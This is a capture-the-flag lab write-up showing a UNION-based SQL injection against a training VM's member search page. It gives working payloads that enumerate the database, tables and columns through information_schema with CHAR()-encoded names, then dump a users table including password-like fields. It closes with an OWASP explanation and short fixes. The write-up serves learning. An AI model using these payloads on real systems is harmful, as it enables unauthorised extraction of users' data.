# SQL injection advanced

Go to ```http://[VM_IP]/index.php?page=member```  
In this case, we perform the same actions as in the other part with the SQL injection (look at SQL-injection-basic)

Enter ```4242 UNION SELECT 4242, database()```  
And we get the name of the database - Member_Sql_Injection.  
According to the familiar scheme, we translate the string into a list of characters:  

Member_Sql_Injection = 77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110

```
4242 UNION SELECT 1, TABLE_NAME
FROM information_schema.TABLES
WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
```

The name of table is users (117,115,101,114,115)

Now we get the columns that are in the table
```
4242 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)
AND TABLE_NAME = CHAR(117,115,101,114,115) 
```

We get the following database fields: user_id, first_name, last_name, town, country, planet, Commentaire, countersign

Make a request, knowing the fields and get the key!
```
4242 UNION SELECT 1, CONCAT(user_id, first_name, last_name, town, country, planet, Commentaire, countersign)
FROM users
```

```
Surname : 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
```

So, we just follow this instructions.

## Explanation
Attack type: [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application.
> A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete),
> execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present
> on the DBMS file system and in some cases issue commands to the operating system.
> SQL injection attacks are a type of injection attack,
> in which SQL commands are injected into data-plane input in order to affect theexecution of predefined SQL commands.

## How to fix it
> Escaping all user supplied input.
> Use of stored procedures.
